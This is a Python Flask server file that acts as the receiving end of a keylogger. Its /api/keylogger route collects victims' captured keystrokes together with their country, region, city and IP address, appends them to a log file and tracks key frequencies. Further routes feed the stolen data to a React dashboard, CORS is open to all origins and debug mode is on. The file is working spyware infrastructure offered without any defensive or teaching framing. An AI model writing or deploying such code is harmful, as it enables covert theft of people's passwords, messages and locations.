from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
from datetime import datetime
import json
import os

app = Flask(__name__, static_folder='dist')
CORS(app)  # Enable CORS for all routes

# In-memory key frequency storage
key_freq = {}

# Ensure log file exists
log_file = "log.txt"
if not os.path.exists(log_file):
    with open(log_file, "w") as f:
        pass  # Create empty file

# Route to receive data from keylogger
@app.route('/api/keylogger', methods=['POST'])
def get_keys():
    try:
        data = request.get_json()
        keystrokes = data.get('keyboardData')
        sentiment = data.get('sentiment')
        geo = data.get('geo')

        # Update key frequency
        for char in keystrokes:
            if char.isalnum():  # Count only alphanumeric keys
                key_freq[char] = key_freq.get(char, 0) + 1

        log_entry = {
            "id": f"log-{datetime.now().timestamp()}",
            "timestamp": str(datetime.now()),
            "keystrokes": keystrokes,
            "sentiment": sentiment,
            "country": geo.get("country", "Unknown"),
            "region": geo.get("region", "Unknown"),
            "city": geo.get("city", "Unknown"),
            "ip_address": geo.get("ip", "Unknown")
        }

        print(f"[+] Data received:\n{json.dumps(log_entry, indent=2)}")

        with open(log_file, "a") as f:
            f.write(json.dumps(log_entry) + "\n")

        return jsonify({"status": "ok"})
    except Exception as e:
        print(f"Error processing keylogger data: {str(e)}")
        return jsonify({"error": str(e)}), 500

# Route to serve logs to frontend dashboard
@app.route('/api/logs', methods=['GET'])
def fetch_logs():
    try:
        logs = []
        if os.path.exists(log_file):
            with open(log_file, "r") as f:
                lines = f.readlines()
                for line in lines:
                    if line.strip():
                        logs.append(json.loads(line))
        
        # Sort logs by timestamp (newest first)
        logs.sort(key=lambda x: x["timestamp"], reverse=True)
        return jsonify(logs)
    except Exception as e:
        print(f"Error fetching logs: {str(e)}")
        return jsonify({"error": str(e)}), 500

# Route to serve key frequency data
@app.route('/api/key_freq', methods=['GET'])
def fetch_key_freq():
    try:
        # Convert to format expected by frontend
        formatted_data = [{"key": k, "count": v} for k, v in key_freq.items()]
        # Sort by frequency (highest first) and limit to top 20
        formatted_data.sort(key=lambda x: x["count"], reverse=True)
        return jsonify(formatted_data[:20])
    except Exception as e:
        print(f"Error fetching key frequency: {str(e)}")
        return jsonify({"error": str(e)}), 500

# Serve the React app
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve(path):
    if path and os.path.exists(os.path.join(app.static_folder, path)):
        return send_from_directory(app.static_folder, path)
    return send_from_directory(app.static_folder, 'index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True) 